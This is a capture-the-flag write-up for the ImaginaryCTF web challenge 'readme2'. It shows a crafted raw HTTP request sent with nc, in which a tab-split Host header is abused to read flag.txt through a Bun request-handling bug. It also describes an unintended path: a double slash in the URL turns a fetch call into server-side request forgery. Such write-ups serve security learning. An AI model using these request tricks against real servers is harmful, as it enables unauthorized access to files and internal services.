# readme2

* Category: Web
* Score: 249/500
* Solves: 56

## Description

Try to read the `flag.txt` file, again!

## Solution

Bun will put the value of `Host` header into `req.url`, which allows us to do many funny things to bypass the check.

```bash
> printf 'GET /.. HTTP/1.0\r\nHost: fakehost/fla\tg.txt\r\n\r\n' | nc readme2.chal.imaginaryctf.org 80
HTTP/1.1 200 OK
Content-Type: text/plain;charset=utf-8
Date: Sun, 21 Jul 2024 08:37:29 GMT
Date: Sun, 21 Jul 2024 08:37:29 GMT
Content-Length: 43

ictf{just_a_funny_bug_in_bun_http_handling}
```

## Unintended Solution :sob:

Due to this line:

```js
return fetch(new URL(url.pathname + url.search, 'http://localhost:3000/'), {
    method: req.method,
    headers: req.headers,
    body: req.body
})
```

You can make `url.pathname` starting with two slashes, and it will be seen as a protocol-relative URL and fetch arbitrary hosts. This means you can set up a server to have it redirect to `http://localhost:3000/flag.txt` and get the flag.
